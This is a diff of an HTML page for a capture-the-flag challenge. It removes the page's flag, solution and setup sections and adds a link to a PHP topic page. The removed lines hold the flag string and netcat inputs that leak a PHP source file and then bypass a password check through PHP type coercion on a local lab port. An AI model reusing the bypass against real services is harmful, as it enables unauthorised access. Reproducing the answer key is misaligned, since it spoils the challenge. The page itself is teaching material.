@@ -1842,11 +1842,7 @@
                 
             <li class="second-level"><a href="#description">Description</a></li>
                 
-            <li class="second-level"><a href="#flag">Flag</a></li>
-                
-            <li class="second-level"><a href="#solution">Solution</a></li>
-                
-            <li class="second-level"><a href="#setup">Setup</a></li>
+            <li class="second-level"><a href="#topics-covered">Topics Covered</a></li>
                 
     </ul>
 </div></div>
@@ -1860,33 +1856,10 @@
 <h2 id="category">Category<a class="headerlink" href="#category" title="Permanent link">&para;</a></h2>
 <p>Misc</p>
 <h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
-<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
-<p><code class="codehilite">flag{ConsiderThisPUNishmentEnough}</code></p>
-<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
-<ol>
-<li>Leak source</li>
-</ol>
-<div class="codehilite"><pre><span></span>nc localhost 5665
-4
-pps.php
-2
-</pre></div>
-
-
-<ol>
-<li>Leak flag
-With the source, find the hidden password, evade the string matching via PHP's awesome forced coersion:</li>
-</ol>
-<div class="codehilite"><pre><span></span>nc localhost 5665
-5
-0xabadfad
-flag
-2
-</pre></div>
-
-
-<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2>
-<p>Just move the files from deploy somewhere on a filesystem. Preferrably give whatever runs the php no permissions to write anything anywhere. Then launch via xinetd on port 5665 (or whatever).</p></div>
+<h2 id="topics-covered">Topics Covered<a class="headerlink" href="#topics-covered" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="../../../../web-exploitation/php/what-is-php/">PHP</a></li>
+</ul></div>
             
         
     </div>
